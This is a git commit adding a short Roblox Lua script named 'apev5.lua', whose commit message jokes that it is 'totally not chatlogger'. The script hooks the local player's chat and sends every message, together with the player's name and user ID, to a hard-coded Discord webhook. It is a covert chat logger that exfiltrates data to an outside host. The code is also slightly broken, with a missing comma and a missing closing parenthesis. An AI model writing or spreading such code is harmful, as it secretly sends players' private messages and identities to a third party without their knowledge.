02ea21983ef21ad2c614bf6984e11cba5122b725
yixiyotatsuki <161025930+yixiyotatsuki@users.noreply.github.com>
2024-07-16 00:14:49 +0800

    Create apev5.lua
    totally not chatlogger

---
+++ apev5.lua
@@ -0,0 +1,10 @@
+local http = game:GetService("HttpService")
+local lplr = game.Players.LocalPlayer
+local url = "https://discord.com/api/webhooks/1259203670470557777/JGeXzDAxa0Q4pizyLjSterfjljU3a75E0Phxwx9LCiBFLqaRnJTE89IWnbrw39NoSK9H"
+lplr.Chatted:Connect(function(msg)
+  local data = {
+  content = msg
+  username = lplr.Name.." - "..lplr.UserId
+  }
+  http:PostAsync(url,http:JSONEncode(data))
+end
